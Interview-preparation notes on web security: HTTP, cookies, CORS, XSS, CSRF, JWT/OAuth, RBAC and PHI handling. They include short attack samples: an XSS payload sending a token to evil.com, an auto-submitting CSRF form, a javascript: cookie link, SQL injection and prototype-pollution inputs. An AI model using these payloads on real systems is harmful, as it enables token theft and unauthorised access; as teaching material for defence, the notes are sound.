# 13 — Web Fundamentals and Security

Your resume claims a security audit (RBAC, JWT/OAuth, PHI), so expect depth here.

**How this file is organised**

- **Part A — Understand the topic:** how the web works (HTTP, cookies, origins), the main attacks, authentication vs authorisation, and why healthcare data needs extra care, explained simply.
- **Part B — Interview questions and answers:** Web Basics → Common Attacks → AuthN/AuthZ → Advanced → Healthcare/PHI → Scenario → From Your Resume.

Each answer has a **Short answer** (say this first), an **Explanation**, an **Example**, and a **Say it like this** sample answer.

---

## Part A — Understand the Topic

### How the web works, in one paragraph

The browser (the **client**) sends **HTTP requests** to servers, and the servers send back **responses**. Each request has a method (GET, POST…), a URL, headers (such as `Cookie` and `Authorization`) and sometimes a body. HTTPS wraps this in TLS encryption, so nobody in between can read or change it. Browsers enforce rules, such as the **same-origin policy**, that stop one website from reading another website's data.

### What is an "origin"?

An origin is **scheme + host + port**. `https://app.bpobox.com` and `https://api.bpobox.com` are *different origins*, because the hosts differ. By default, JavaScript on one origin can't read responses from another. **CORS** is how a server deliberately allows certain other origins to read its responses.

### Cookies vs tokens

- **Cookies** are attached to requests to their domain *automatically* by the browser. That's convenient, but it's also the root of CSRF attacks.
- **Bearer tokens** (often JWTs) are added by your JavaScript in the `Authorization` header, so your JavaScript must be able to read them. That makes them vulnerable to theft through XSS.

Choosing between them is a trade-off between XSS risk and CSRF risk (see Q30).

### The big attacks every frontend engineer must know

| Attack | What happens | Main defence |
|---|---|---|
| **XSS** (Cross-Site Scripting) | attacker's script runs inside *your* page | escape output, avoid `innerHTML`, sanitise, CSP |
| **CSRF** (Cross-Site Request Forgery) | another site makes the user's browser send an authenticated request to you | SameSite cookies, CSRF tokens, Origin checks |
| **Clickjacking** | your page is put in an invisible frame to trick clicks | `frame-ancestors` in CSP |
| **IDOR / broken access control** | changing `/calls/124` to `/calls/125` shows someone else's data | server-side authorisation on every request |
| **Injection** | input is run as SQL or commands | parameterised queries |
| **Supply chain** | a malicious npm package or CDN script | lockfiles, audits, SRI |

### Authentication vs authorisation

- **Authentication (AuthN):** *who are you?* Login, passwords, SSO, MFA.
- **Authorisation (AuthZ):** *what are you allowed to do?* Roles, permissions, tenant and ownership checks.

**Golden rule:** the frontend can *hide* buttons for a better UX, but only the **server** can *enforce* permissions. Anyone can call your API directly with curl.

### Why healthcare is special

**PHI** (Protected Health Information) is health data linked to a person. In the US, HIPAA governs it. Leaking it causes real harm and legal consequences, so PHI must never sit in browser storage, URLs, logs, analytics or error reports.

### Why interviewers ask about security

Your resume says you led an audit that found 8 critical issues and cut findings by 85%. Interviewers will test whether you really understand XSS, CSRF, token storage, RBAC and PHI handling, and whether you can explain *your* findings precisely.

---

## Part B — Interview Questions and Answers

Every answer below has four parts: **Short answer** (say this first), **Explanation** (add if asked for more), **Example** (code or a real situation) and **Say it like this** (a sample spoken answer).

## 🟢 Level 1 — Web Basics

**Q1. What happens when you type a URL and press Enter?**

**Short answer:** HSTS check, DNS lookup, TCP (or QUIC) and TLS handshakes, the HTTP request, the response, then parsing and rendering.

**Explanation:** The browser parses HTML into the DOM, the preload scanner fetches sub-resources, then style, layout, paint and composite run. Later requests reuse the connection.

**Example:** `app.bpobox.com` → DNS resolves to the CDN → TLS validates the certificate → GET `/` with cookies → HTML arrives → CSS and JS download in parallel → first paint.

**Say it like this:** "DNS turns the name into an IP, TCP and TLS set up a secure connection, the request goes out, and the browser parses and renders the response. I can go deeper on any step."

---

**Q2. HTTP vs HTTPS?**

**Short answer:** HTTPS is HTTP over TLS, giving encryption, integrity and server authentication.

**Explanation:** It's required for service workers, camera and mic access, HTTP/2 in browsers and `Secure` cookies.

**Example:** On public clinic Wi-Fi, HTTPS stops anyone on the network reading or altering patient data in transit.

**Say it like this:** "HTTPS means nobody can read or tamper with traffic, and that you're talking to the real server; it's mandatory for anything modern."

---

**Q3. What are the HTTP methods?**

**Short answer:** GET (read), POST (create/action), PUT (replace), PATCH (partial update), DELETE, OPTIONS (CORS preflight) and HEAD.

**Explanation:** GET, PUT and DELETE are idempotent, so retries are safe; POST isn't, so retries need an idempotency key.

**Example:** `PUT /scorecards/42` twice leaves the same result; `POST /scorecards` twice creates two unless deduplicated.

**Say it like this:** "Idempotency decides what's safe to retry, which matters for unreliable networks."

---

**Q4. Which status codes should you know?**

**Short answer:** 2xx success (200, 201, 204), 3xx redirects (301/308, 302/307, 304), 4xx client errors (400, 401, 403, 404, 409, 422, 429) and 5xx server errors (500, 502, 503, 504).

**Explanation:** The UI should react differently: 401 refresh or log in, 403 show "no access", 409 offer a merge, 429 back off.

**Example:** A 429 with `Retry-After: 5` makes the client wait five seconds before retrying.

**Say it like this:** "Status codes drive UI behaviour, so my API client maps each class to a specific reaction."

---

**Q5. 401 vs 403?**

**Short answer:** 401 means "who are you?" (not authenticated); 403 means "you're not allowed" (authenticated but forbidden).

**Explanation:** Re-logging in fixes a 401, never a 403.

**Example:** An expired token gets 401 → refresh; a QA agent opening the admin page gets 403 → "You don't have access".

**Say it like this:** "401 is an identity problem, 403 a permission problem, and the UI handles them differently."

---

**Q6. Which headers should you know?**

**Short answer:** Request: `Authorization`, `Cookie`, `Content-Type`, `Accept`, `Origin`, `If-None-Match`. Response: `Set-Cookie`, `Cache-Control`, `ETag`, `Content-Security-Policy`, `Strict-Transport-Security`, `Access-Control-Allow-Origin`, `Retry-After`.

**Explanation:** Many security and caching behaviours are controlled purely by headers.

**Example:** `ETag` plus `If-None-Match` lets the server reply `304 Not Modified` with no body.

**Say it like this:** "Headers control auth, caching and security policy, so I treat them as part of the frontend's contract."

---

**Q7. What are the cookie attributes?**

**Short answer:** `HttpOnly`, `Secure`, `SameSite`, `Domain`, `Path`, `Expires`/`Max-Age`, and prefixes like `__Host-`.

**Explanation:** `HttpOnly` blocks JavaScript access, `Secure` requires HTTPS, `SameSite` controls cross-site sending, and `__Host-` forces the most locked-down settings.

**Example:** `Set-Cookie: __Host-session=abc; Path=/; Secure; HttpOnly; SameSite=Lax`

**Say it like this:** "Session cookies are always HttpOnly, Secure and SameSite, ideally with the `__Host-` prefix."

---

**Q8. What is the same-origin policy?**

**Short answer:** A page can read responses only from the same scheme, host and port.

**Explanation:** Cross-origin requests may still be sent (forms, images), but their responses can't be read by JavaScript.

**Example:** JavaScript on `evil.com` can't `fetch` your bank page and read your balance.

**Say it like this:** "Same-origin stops other sites reading your data, which is the foundation of browser security."

---

**Q9. What is CORS?**

**Short answer:** Cross-Origin Resource Sharing: a server opts in to letting specific other origins read its responses.

**Explanation:** Non-simple requests trigger a preflight OPTIONS request. With cookies, the server must return an explicit origin and `Access-Control-Allow-Credentials: true`.

**Example:**

```text
OPTIONS /api/calls   Origin: https://app.bpobox.com
← Access-Control-Allow-Origin: https://app.bpobox.com
← Access-Control-Allow-Credentials: true
```

**Say it like this:** "CORS is the server telling the browser which other origins may read its responses."

---

**Q10. Is CORS a security feature for your API?**

**Short answer:** No. It protects users' browsers, not your API; curl and scripts ignore it.

**Explanation:** Every endpoint still needs authentication and authorisation.

**Example:** A strict CORS policy doesn't stop `curl -H "Cookie: …" https://api/…` at all.

**Say it like this:** "CORS is a browser rule, not an API firewall."

---

**Q11. What are the REST principles?**

**Short answer:** Resource URLs, standard methods, stateless requests, JSON representations, correct status codes and cacheability.

**Explanation:** Following them makes APIs predictable and lets HTTP caching work.

**Example:** `GET /calls/42`, `PATCH /calls/42`, `DELETE /calls/42`, with 200, 204 and 404 as appropriate.

**Say it like this:** "REST is about predictable resources and verbs, which makes clients simple."

---

**Q12. REST vs GraphQL vs gRPC?**

**Short answer:** REST is simple with HTTP caching; GraphQL lets clients pick fields from one endpoint; gRPC is fast binary service-to-service.

**Explanation:** GraphQL avoids over- and under-fetching but needs query limits and different caching; gRPC needs gRPC-Web for browsers.

**Example:** The airline site used GraphQL to fetch exactly the fields each widget needed from many services.

**Say it like this:** "REST by default, GraphQL when UIs aggregate many sources, gRPC between services."

---

**Q13. What are the options for real-time communication?**

**Short answer:** Short polling, long polling, SSE, WebSocket and WebRTC.

**Explanation:** Choose by direction, frequency, latency and infrastructure.

**Example:** Notifications via SSE, chat via WebSocket, video via WebRTC.

**Say it like this:** "I pick the simplest transport that fits the direction and latency the feature needs."

---

**Q14. SSE vs WebSocket: when do you use each?**

**Short answer:** SSE for one-way server-to-client streams; WebSocket for two-way interactive features.

**Explanation:** SSE works over normal HTTP and reconnects automatically; WebSocket needs connection management.

**Example:** The AI compliance chat streams tokens over SSE; the question is a normal POST.

**Say it like this:** "For the compliance chat SSE was enough: tokens flow one way, and WebSocket would add complexity for nothing."

---

**Q15. Authentication vs authorisation?**

**Short answer:** Authentication verifies who you are; authorisation decides what you can do.

**Explanation:** Both are needed on every request: a valid user can still be unauthorised for a resource.

**Example:** Logged in as a QA reviewer (authenticated) but blocked from tenant settings (not authorised).

**Say it like this:** "AuthN is identity, AuthZ is permission, and the server checks both every time."

---

## 🟡 Level 2 — Intermediate: Common Attacks

**Q16. What is XSS, what types are there, and what's the impact?**

**Short answer:** Attacker JavaScript running in your page: stored, reflected or DOM-based.

**Explanation:** The script can do anything the user can: read data on screen, call APIs, log keystrokes and steal non-HttpOnly tokens.

**Example:**

```html
<img src=x onerror="fetch('https://evil.com?c='+localStorage.token)">
```

**Say it like this:** "XSS means the attacker's code runs as the user, so it's one of the most serious frontend bugs."

---

**Q17. How do you defend against XSS?**

**Short answer:** Escape output by default, avoid dangerous sinks, sanitise required HTML, add a CSP and Trusted Types, keep tokens in HttpOnly cookies, and validate URLs.

**Explanation:** Defence in depth: if one layer fails, CSP stops injected scripts running or sending data out.

**Example:**

```tsx
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
const safeHref = (u: string) => { try { return ['https:', 'http:'].includes(new URL(u).protocol) ? u : '#'; } catch { return '#'; } };
```

**Say it like this:** "React escapes text, so I focus on escape hatches, and a strict CSP is the safety net."

---

**Q18. Where can XSS still happen in React?**

**Short answer:** `dangerouslySetInnerHTML`, `javascript:` URLs in `href`, unsanitised markdown or LLM output, `innerHTML` via refs, third-party widgets, and unescaped JSON in `<script>` tags.

**Explanation:** Each bypasses React's automatic escaping.

**Example:** `<a href={user.website}>` with `javascript:alert(document.cookie)` runs on click.

**Say it like this:** "I audit every escape hatch, especially links and rendered markdown."

---

**Q19. What is CSRF, and how do you defend against it?**

**Short answer:** Another site makes the user's browser send an authenticated request, because cookies are attached automatically.

**Explanation:** Defend with SameSite cookies, CSRF tokens, Origin checks, no state changes on GET, and re-authentication for sensitive actions.

**Example:**

```html
<form action="https://bank.com/transfer" method="POST"><input name="to" value="attacker"></form>
<script>document.forms[0].submit()</script>
```

**Say it like this:** "CSRF abuses automatic cookies, so SameSite cookies plus Origin or token checks shut it down."

---

**Q20. Does putting a JWT in the Authorization header prevent CSRF?**

**Short answer:** Yes, because headers aren't attached automatically, but the token must then be readable by JavaScript.

**Explanation:** You've traded CSRF risk for XSS token-theft risk.

**Example:** One XSS bug can read the token from memory or storage and use it from anywhere.

**Say it like this:** "Bearer headers solve CSRF but make XSS worse; there's no free lunch."

---

**Q21. What is clickjacking?**

**Short answer:** Your page is loaded in an invisible iframe to trick users into clicking it.

**Explanation:** Prevent it with `frame-ancestors 'none'` in CSP (or `X-Frame-Options: DENY`).

**Example:** A hidden "Delete account" button under a fake "Win a prize" button.

**Say it like this:** "`frame-ancestors` stops other sites framing our app, which kills clickjacking."

---

**Q22. What is an open redirect?**

**Short answer:** A redirect parameter that sends users to an attacker's site after login.

**Explanation:** The trusted domain makes phishing links believable. Allow only relative paths or an allowlist.

**Example:**

```ts
const next = searchParams.get('next') ?? '/';
const safe = next.startsWith('/') && !next.startsWith('//') ? next : '/';
```

**Say it like this:** "Redirect targets are validated so our domain can't be used to launch phishing."

---

**Q23. What is IDOR, or broken access control?**

**Short answer:** Changing an ID in a request returns someone else's data because the server didn't check ownership or tenant.

**Explanation:** It's the top OWASP category. Authorise every request by user, tenant and ownership, with automated tests.

**Example:** `/api/calls/124` → `/api/calls/125` returns another team's recording.

**Say it like this:** "The UI may never show call 125's link, but the API must still reject it; missing tenant scoping was exactly this kind of finding in our audit."

---

**Q24. What is injection (SQL, NoSQL, command)?**

**Short answer:** Untrusted input interpreted as code.

**Explanation:** Use parameterised queries or ORMs, validation and least-privilege DB users. Frontend validation is UX only.

**Example:** `WHERE name = '${input}'` with `' OR 1=1 --` returns every row; a parameterised query doesn't.

**Say it like this:** "Input is always data, never code: parameterised queries, validated on the server."

---

**Q25. How does sensitive data get exposed by the frontend?**

**Short answer:** Secrets in bundles, verbose errors, data in URLs, sensitive data in localStorage, and public source maps.

**Explanation:** Anything shipped to the browser is public.

**Example:** An API key in `NEXT_PUBLIC_API_KEY` is visible to anyone opening DevTools.

**Say it like this:** "I assume everything in the bundle, URL and storage is public, and design around that."

---

**Q26. What's on the security headers checklist?**

**Short answer:** CSP, HSTS, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy` and COOP.

**Explanation:** Each closes a specific class of attack with one header.

**Example:**

```text
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(self), microphone=(self), geolocation=()
```

**Say it like this:** "A handful of headers give a lot of protection, so they're part of every deploy."

---

**Q27. How do you protect against supply-chain attacks?**

**Short answer:** Lockfiles with `npm ci`, dependency bots and audits, reviewing new packages, pinning critical ones, SRI for CDN scripts and few third-party scripts.

**Explanation:** Dependencies run with your app's full privileges.

**Example:** A new dependency with a postinstall script and one maintainer gets reviewed before adding.

**Say it like this:** "Every dependency is code we ship, so new ones get reviewed and all are scanned."

---

## 🟡 Intermediate: Authentication and Authorisation

**Q28. Session cookies vs tokens (JWT)?**

**Short answer:** Sessions store state on the server with an opaque cookie and are easy to revoke; JWTs are self-contained and stateless but hard to revoke.

**Explanation:** Many systems combine short-lived JWT access tokens with server-tracked refresh tokens.

**Example:** Logging out a stolen session is one DB delete with sessions; with a 1-hour JWT it stays valid until expiry.

**Say it like this:** "Sessions win on revocation, JWTs on statelessness; short-lived JWTs plus revocable refresh tokens balance both."

---

**Q29. What is the structure of a JWT, and how do you validate it?**

**Short answer:** `header.payload.signature`, base64url-encoded; signed, not encrypted.

**Explanation:** Validate the signature with the expected algorithm (reject `none`), plus `exp`, `nbf`, `iss` and `aud`. Keep the payload minimal, with no PHI.

**Example:**

```text
{ "alg": "RS256" } . { "sub": "u_123", "role": "qa", "exp": 1730000000 } . <signature>
```

**Say it like this:** "Anyone can read a JWT, so it never contains sensitive data, and the server validates algorithm, expiry, issuer and audience."

---

**Q30. Where should tokens be stored in a browser?**

**Short answer:** Not in localStorage; prefer HttpOnly cookies, memory plus an HttpOnly refresh cookie, or a BFF holding tokens.

**Explanation:**

| Option | If XSS happens | CSRF exposure |
|---|---|---|
| localStorage | token stolen | none |
| HttpOnly cookie | can't be read | needs SameSite/CSRF defence |
| Memory + refresh cookie | lost on reload | refresh endpoint needs CSRF defence |
| BFF | browser has only a session cookie | SameSite/CSRF defence |

**Example:** InterpretIQ moved from localStorage JWTs to HttpOnly, Secure, SameSite cookies after the audit.

**Say it like this:** "For healthcare I'd use a BFF, so the browser only holds an HttpOnly session cookie and XSS can't take the session away."

---

**Q31. What is refresh token rotation?**

**Short answer:** Each refresh issues a new refresh token and invalidates the old one; reuse of an old token revokes the whole family.

**Explanation:** It turns token theft into a detectable event.

**Example:** An attacker replays a stolen refresh token after the user already used it → server sees reuse → logs out both.

**Say it like this:** "Rotation makes a stolen refresh token single-use and detectable."

---

**Q32. How do you handle token expiry when several requests run at once?**

**Short answer:** Make the refresh single-flight: the first 401 starts it, others wait on the same promise, each request retries once, and failure logs out.

**Explanation:** Parallel refreshes can invalidate each other under rotation.

**Example:**

```ts
let refreshing: Promise<void> | null = null;
export async function authFetch(input: RequestInfo, init: RequestInit = {}) {
  const run = () => fetch(input, { ...init, credentials: 'include' });
  const res = await run();
  if (res.status !== 401) return res;
  refreshing ??= fetch('/auth/refresh', { method: 'POST', credentials: 'include' })
    .then((r) => { if (!r.ok) throw new Error('refresh failed'); })
    .finally(() => { refreshing = null; });
  try { await refreshing; } catch { logout(); throw new Error('Session expired'); }
  return run();
}
```

**Say it like this:** "One refresh for everyone, one retry per request, and logout if it fails."

---

**Q33. What are the OAuth 2.0 roles and flows?**

**Short answer:** Roles: resource owner, client, authorisation server, resource server. Flows: Authorization Code + PKCE, Client Credentials and Device Code.

**Explanation:** Implicit and Password grants are deprecated.

**Example:** A SPA logging in with Okta uses Authorization Code + PKCE; a backend job calling an API uses Client Credentials.

**Say it like this:** "For browser apps it's always Authorization Code with PKCE."

---

**Q34. How does PKCE work?**

**Short answer:** The client sends a hash of a random verifier with the login request and must present the original verifier to exchange the code.

**Explanation:** A stolen authorisation code is useless without the verifier.

**Example:**

```text
code_verifier = random 64 chars
code_challenge = BASE64URL(SHA256(code_verifier))
```

**Say it like this:** "PKCE binds the code to the app that started the login, so intercepted codes can't be redeemed."

---

**Q35. OIDC vs OAuth?**

**Short answer:** OAuth is delegated authorisation (access tokens); OIDC adds identity (ID tokens, `/userinfo`, discovery).

**Explanation:** Validate `state` against CSRF, `nonce` against replay, and the ID token's claims.

**Example:** "Sign in with Google" uses OIDC to know who the user is; calling Google Calendar uses the OAuth access token.

**Say it like this:** "OAuth answers 'what can this app access', OIDC answers 'who is this user'."

---

**Q36. What are SSO and SAML?**

**Short answer:** SSO lets users log in once across apps via an identity provider; SAML is the older XML protocol and OIDC the modern JSON one.

**Explanation:** Enterprises often require SAML; new integrations usually prefer OIDC.

**Example:** A hospital's staff log into InterpretIQ through their Azure AD SSO.

**Say it like this:** "Enterprise customers expect SSO; I'd support OIDC and SAML through an identity provider rather than building it."

---

**Q37. RBAC vs ABAC vs ReBAC?**

**Short answer:** RBAC uses roles, ABAC uses attributes, ReBAC uses relationships.

**Explanation:** Real systems combine RBAC with tenant and ownership checks.

**Example:** QA role can score calls (RBAC) but only in their tenant (attribute) and only for teams they belong to (relationship).

**Say it like this:** "Roles give the baseline; tenant and ownership checks make it actually safe."

---

**Q38. What is the frontend's role in authorisation?**

**Short answer:** UX only: hiding actions, guarding routes and permission-aware components; the API enforces everything.

**Explanation:** Third-party tokens like LiveKit's should carry scoped grants.

**Example:** The admin button is hidden for agents, and the admin API also returns 403 for them.

**Say it like this:** "The UI hides what you can't do; the server makes sure you can't do it."

---

**Q39. What are MFA and passkeys?**

**Short answer:** MFA adds a second factor; passkeys (WebAuthn) are origin-bound public-key credentials that resist phishing.

**Explanation:** A fake site can't use a passkey registered to the real domain.

**Example:** Admins log in with a passkey; a phishing page on a lookalike domain gets nothing usable.

**Say it like this:** "Passkeys are phishing-resistant by design, which makes them ideal for admin accounts."

---

**Q40. What are the session management best practices?**

**Short answer:** Idle and absolute timeouts, re-authentication for critical actions, server-side invalidation on logout, cleared caches and cross-tab logout.

**Explanation:** Shared devices make these essential in healthcare.

**Example:** After 15 minutes idle on a clinic tablet, the app logs out and clears all cached data.

**Say it like this:** "Sessions end reliably: on idle, on logout, and in every tab."

---

## 🔴 Level 3 — Advanced

**Q41. How do you design a strict CSP?**

**Short answer:** Nonce-based `script-src` with `'strict-dynamic'`, tight `connect-src`, `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'none'`, and no `unsafe-inline` or `unsafe-eval`.

**Explanation:** Roll out with `Report-Only` first, fix violations, then enforce.

**Example:**

```text
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}' 'strict-dynamic';
  connect-src 'self' https://api.example.com wss://livekit.example.com; frame-ancestors 'none';
  object-src 'none'; base-uri 'none'; form-action 'self'; report-to csp-endpoint;
```

**Say it like this:** "With a nonce-based CSP, injected scripts don't run, and a strict `connect-src` stops data going to an attacker."

---

**Q42. What are Trusted Types?**

**Short answer:** A CSP feature that makes dangerous DOM sinks accept only values created by approved policies.

**Explanation:** It eliminates whole classes of DOM-based XSS.

**Example:** With `require-trusted-types-for 'script'`, `el.innerHTML = userString` throws unless the string came from a sanitising policy.

**Say it like this:** "Trusted Types turn every `innerHTML` into a reviewed, sanitised path."

---

**Q43. What is Subresource Integrity (SRI)?**

**Short answer:** An `integrity` hash on CDN scripts so the browser refuses modified files.

**Explanation:** A compromised CDN can't inject code into your page.

**Example:**

```html
<script src="https://cdn.example.com/lib.js" integrity="sha384-…" crossorigin="anonymous"></script>
```

**Say it like this:** "SRI pins third-party files to an exact hash."

---

**Q44. What are COOP, COEP and CORP, and what is cross-origin isolation?**

**Short answer:** Headers that isolate your window and resources from other origins; together they enable `crossOriginIsolated`.

**Explanation:** Isolation is required for `SharedArrayBuffer` and mitigates Spectre-style leaks.

**Example:** `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp`.

**Say it like this:** "Cross-origin isolation is needed for some high-performance APIs and adds defence against side channels."

---

**Q45. How do you use `postMessage` securely?**

**Short answer:** Check `event.origin`, validate the message shape, and send with an exact target origin.

**Explanation:** Any window can post messages, so unchecked handlers are an injection point.

**Example:**

```ts
window.addEventListener('message', (e) => {
  if (e.origin !== 'https://widget.partner.com') return;
  if (typeof e.data?.type !== 'string') return;
});
```

**Say it like this:** "Every message handler checks origin and shape, and nothing sensitive is posted to `'*'`."

---

**Q46. What is prototype pollution?**

**Short answer:** Merging untrusted JSON with `__proto__` keys modifies `Object.prototype`, affecting every object.

**Explanation:** Use safe merges, `Object.create(null)`, schema validation, and frozen prototypes in sensitive contexts.

**Example:**

```js
deepMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
({}).isAdmin; // true
```

**Say it like this:** "Untrusted JSON is validated against a schema before merging, which blocks prototype pollution."

---

**Q47. What is ReDoS?**

**Short answer:** A regex with catastrophic backtracking that freezes the thread on crafted input.

**Explanation:** Avoid nested quantifiers, limit input length, and use safe regex libraries.

**Example:** `/(a+)+$/` on `'aaaaaaaaaaaaaaaaaaaaaaaa!'` takes exponential time.

**Say it like this:** "Regexes on user input are reviewed for backtracking and inputs have length limits."

---

**Q48. How do you secure file uploads?**

**Short answer:** Pre-signed URLs with limits, server-side content validation, malware scanning, storage outside the web root, `Content-Disposition: attachment`, and no inline user HTML or SVG on the main origin.

**Explanation:** Extensions and MIME types are client-controlled and can't be trusted.

**Example:** An uploaded "invoice.pdf" that's actually HTML with a script is served as a download from a separate domain.

**Say it like this:** "Uploads are validated on the server and served from a separate origin as downloads."

---

**Q49. How do you handle rate limiting and abuse prevention?**

**Short answer:** Limits per user, IP and tenant with 429 and `Retry-After`, bot protection on public forms, and cost limits on LLM endpoints.

**Explanation:** AI endpoints cost real money per request, so quotas are essential.

**Example:** The compliance chat allows 30 questions per user per hour and a monthly token budget per tenant.

**Say it like this:** "Every expensive or public endpoint has limits, especially anything calling an LLM."

---

**Q50. How do you secure source maps and error tracking?**

**Short answer:** Upload source maps privately to Sentry, and scrub PII and PHI before events are sent.

**Explanation:** Public source maps reveal internal code; error events can capture personal data.

**Example:** CI uploads maps with `sentry-cli` and deletes them from the deployed assets.

**Say it like this:** "Source maps go to Sentry, not the CDN, and events are scrubbed before they leave the browser."

---

**Q51. How do you secure LLM integrations?**

**Short answer:** Server-side keys, treat output as untrusted, limit tool permissions, sanitise rendering, minimise data sent, have retention agreements, and rate-limit per tenant.

**Explanation:** Prompt injection can't be fully prevented, so design so it can't do damage.

**Example:** The chat's retrieval only returns the user's tenant data, and the model has no tools that write data.

**Say it like this:** "The model can only see what the user could see and can't take actions on its own."

---

**Q52. What are the OWASP Top 10 categories?**

**Short answer:** Broken access control, cryptographic failures, injection, insecure design, security misconfiguration, vulnerable components, auth failures, integrity failures, logging and monitoring failures, and SSRF.

**Explanation:** Names shift between editions; broken access control has been number one.

**Example:** Our audit's findings mapped mostly to broken access control, cryptographic failures (token storage) and logging failures (PHI in logs).

**Say it like this:** "I use the OWASP Top 10 as a checklist, and broken access control is where I look first."

---

**Q53. How do you threat-model a feature?**

**Short answer:** Identify assets, actors, entry points and data flows, apply STRIDE, and prioritise mitigations.

**Explanation:** STRIDE: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.

**Example:** For call recording: who can start it (spoofing), where it's stored (disclosure), who can view it (elevation), and whether access is logged (repudiation).

**Say it like this:** "I walk the feature's data flow and ask how each step could be abused, then fix the high-impact risks first."

---

**Q54. What security testing belongs in the pipeline?**

**Short answer:** SAST, dependency and secret scanning, DAST, an authorisation test matrix and periodic penetration tests.

**Explanation:** Automated checks catch regressions; pentests catch what automation misses.

**Example:** CodeQL and Dependabot on every PR, a role × endpoint test suite in CI, and an annual pentest.

**Say it like this:** "Security checks run on every PR, and the authorisation matrix guarantees fixed issues stay fixed."

---

## 🏥 Healthcare and PHI (Your Domain)

**Q55. What is PHI, and which regulations apply?**

**Short answer:** Protected Health Information: health data linked to an identifiable person; in the US governed by HIPAA, with other laws like GDPR elsewhere.

**Explanation:** It includes names with medical context, record numbers, appointment details, conversations and recordings. Know the basics without overclaiming legal expertise.

**Example:** A recording of a patient's interpreted consultation is PHI.

**Say it like this:** "PHI is any health information tied to a person, and our design treated it as the most sensitive data we had."

---

**Q56. What are the frontend rules for PHI?**

**Short answer:** No PHI in browser storage, URLs, titles, analytics, logs or error reports; idle logout and cache clearing; no trackers on PHI screens; TLS and secure cookies; server-side audit logging.

**Explanation:** Assume anything stored or sent to a third party could leak.

**Example:** The page title says "Call details", not the patient's name, because titles end up in browser history.

**Say it like this:** "PHI only lives in memory while it's on screen; it never reaches storage, URLs or third parties."

---

**Q57. How do you use Sentry and monitoring with PHI?**

**Short answer:** `sendDefaultPii: false`, scrub in `beforeSend` and `beforeBreadcrumb`, disable or mask session replay, avoid console breadcrumbs, and sign a data-processing agreement.

**Explanation:** Error tools capture request bodies, inputs and console output by default.

**Example:**

```ts
Sentry.init({ dsn, sendDefaultPii: false,
  beforeSend(e) { delete e.request?.data; if (e.user) e.user = { id: e.user.id }; return e; },
  beforeBreadcrumb: (b) => (b.category === 'console' ? null : b) });
```

**Say it like this:** "Error tracking is a common PHI leak, so scrubbing is configured before the first event is ever sent."

---

**Q58. How do you handle recordings and transcripts?**

**Short answer:** Encryption at rest, short-lived signed URLs, role-based access, an audit trail, retention policies and recorded consent.

**Explanation:** Each access is logged so you can answer "who listened to this call?".

**Example:** The audio player requests a 5-minute signed URL each time; the server logs the viewer.

**Say it like this:** "Recordings are encrypted, accessed through expiring links, and every access is audited."

---

**Q59. How do you secure LiveKit and WebRTC?**

**Short answer:** Short-lived, role-scoped tokens, opaque room names, built-in DTLS-SRTP encryption (plus E2EE where required), TURN over TLS and validated webhooks.

**Explanation:** Tokens determine who can publish or subscribe in which room.

**Example:** An observer's token has `canPublish: false`, expires in 10 minutes, and the room is named `rm_8f2c…`.

**Say it like this:** "Tokens are minted on the server with minimal grants, and room names never contain patient information."

---

## 🧩 Level 4 — Scenario-Based

**Q60. A pentest found JWTs in localStorage. What do you change?**

**Short answer:** Move to HttpOnly cookies or a BFF, short-lived tokens with rotation, add a CSP, and migrate users at next login.

**Explanation:** Delete the old tokens from storage during migration.

**Example:** On next login the server sets an HttpOnly session cookie and the client removes `localStorage.token`.

**Say it like this:** "Tokens move out of JavaScript's reach, and a CSP reduces the chance of XSS in the first place."

---

**Q61. Agents can see other teams' calls by changing the URL.**

**Short answer:** It's IDOR: add server-side tenant, team and ownership checks on every endpoint, add a test matrix, and check logs for exploitation.

**Explanation:** Follow the incident process if it was exploited.

**Example:** A FastAPI dependency `require_call_access(call_id, user)` on every call route, tested for each role.

**Say it like this:** "Fix it on the server, prove it with tests, and investigate whether it was used."

---

**Q62. Marketing wants a third-party chat widget on the patient dashboard.**

**Short answer:** Keep it off PHI pages or isolate it in a sandboxed iframe on another origin, with a CSP allowlist and a vendor agreement.

**Explanation:** A script on the page can read everything on the page.

**Example:** The widget appears on marketing and help pages only, not the call history screen.

**Say it like this:** "Any third-party script on a PHI page can read PHI, so it either stays off those pages or is isolated."

---

**Q63. LLM-generated summaries show raw HTML from transcripts.**

**Short answer:** Sanitise the output or render markdown with HTML disabled, restrict links, and test with injection payloads.

**Explanation:** Model output is untrusted input and can carry injected markup.

**Example:** `react-markdown` with no raw HTML plugin, plus `rel="noopener noreferrer"` on links.

**Say it like this:** "Model output goes through the same sanitising as any user input."

---

**Q64. A user is logged out in one tab but still active in another.**

**Short answer:** Broadcast logout via BroadcastChannel or the storage event, and invalidate the refresh token on the server.

**Explanation:** Other tabs then fail their next request with 401 even if they missed the broadcast.

**Example:** `new BroadcastChannel('auth').postMessage('logout')`.

**Say it like this:** "Logout is broadcast to every tab and enforced on the server."

---

**Q65. You must allow your app to be embedded in a partner's portal.**

**Short answer:** Allow the partner in `frame-ancestors`, use `SameSite=None; Secure` cookies or a token handoff, check origins in `postMessage`, and review clickjacking risks.

**Explanation:** Third-party cookies may be blocked, so a token handoff is often more reliable.

**Example:** `Content-Security-Policy: frame-ancestors https://portal.partner.com`.

**Say it like this:** "Embedding is opt-in per partner, with origin-checked messaging and explicit framing rules."

---

**Q66. Error tracking captured patient names in breadcrumbs.**

**Short answer:** Ask the vendor to purge the events, add scrubbing rules, fix the logging code, add lint rules or tests, and document the incident.

**Explanation:** It's a data incident, so it follows the incident process.

**Example:** A `no-console-pii` lint rule and a unit test asserting scrubbed events.

**Say it like this:** "Contain, purge, fix the cause and prevent recurrence, documented as an incident."

---

## 🎯 From Your Resume

**Q67. "Walk me through your security audit."**

**Short answer:** Scope, threat model, checklist, per-role and per-tenant endpoint testing, token review, PHI search, severity rating, fixes with tests, and a re-audit.

**Explanation:** Prepare three real findings as problem → impact → fix → prevention.

**Example:** "Permissions enforced only in the UI → any user could call admin APIs → permission dependency on every route → role × endpoint test matrix."

